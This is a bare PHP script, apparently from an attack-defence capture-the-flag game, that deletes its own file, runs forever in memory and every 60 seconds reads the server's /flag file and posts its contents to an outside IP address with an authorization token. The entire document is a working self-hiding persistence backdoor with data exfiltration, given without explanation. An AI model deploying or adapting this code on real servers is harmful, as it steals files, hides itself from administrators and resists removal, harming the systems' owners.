<?php 
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
while (1){
    system('python -c \'import requests; import time; f=open("/flag","r"); a=f.read(); f.close(); a=a[0:48]; a=requests.post("http://188.100.4.201:19999/api/flag",headers={"Content-Type":"application/json","Authorization":"91ed264fc48572e365c7ecca8a72ebf5"},data="{ \"flag\": \""+a+"\" }")\'');
    sleep(60);
} 
?>